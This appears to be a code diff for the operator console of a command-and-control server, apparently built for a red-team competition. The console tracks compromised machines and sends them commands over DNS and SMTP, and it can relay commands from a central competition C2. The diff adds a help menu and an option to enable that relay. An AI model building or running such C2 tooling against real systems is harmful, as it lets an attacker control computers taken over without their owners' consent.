@@ -13,6 +13,21 @@ def machineList(machines):
     for i in range(len(machines)):
         print(i, ":  ",machines[i])
 
+def printHelp():
+    print("Commands:")
+    print("         l    - List all known machines")
+    print("         dl   - List known machines from DNS")
+    print("         dc # - Set command for machine # over DNS")
+    print("         da   - Set command for all machines over DNS")
+    print("         ml   - List known machines from mail")
+    print("         mc # - Set command for machine # over mail")
+    print("         ma   - Set command for all machines over mail")
+    print("         c2i  - Set the IP or FQDN of the ISTS C2")
+    print("         c2e  - Enable running commands from ISTS C2")
+    print("         c2d  - Disable running commands from ISTS C2")
+    print("         exit - Exit and stop running the server")
+    print("         help - This help again")
+
 def main():
     mail = smtp.server.MailmanServer(("0.0.0.0", 25), None)
     resolver = MemeResolver()
@@ -23,18 +38,11 @@ def main():
     thread = threading.Thread(target=asyncore.loop, kwargs={'timeout': 1})
     thread.start()
     print("SMTP server on TCP 25 started")
-    print("Commands:")
-    print("         l    - List all known machines")
-    print("         dl   - List known machines from DNS")
-    print("         dc # - Set command for machine # over DNS")
-    print("         ml   - List known machines from mail")
-    print("         mc # - Set command for machine # over mail")
-    print("         c2i  - Set the IP or FQDN of the ISTS C2")
-    print("         c2d  - Enable running commands from ISTS C2 (in case of compromise)")
+    printHelp()
     try:
         while 1:
             cmd = input("mailman# ")
-            if cmd == "" or cmd == None:
+            if cmd.strip("\n\t ") == "" or cmd == None:
                 continue
             if cmd == "l":
                 print("DNS Targets:")
@@ -63,10 +71,14 @@ def main():
                 if cmd[2] == "i":
                     istsIP = input("ISTS C2 Address (include trailing .): ")
                     resolver.setC2(istsIP)
+                if cmd[2] == "e":
+                    resolver.enableC2()
                 if cmd[2] == 'd':
                     resolver.disableC2()
                 else:
                     print("Unknown command.")
+            elif cmd == "help" or cmd == "?":
+                printHelp()
             else:
                 print("Unknown command.")
     except KeyboardInterrupt:
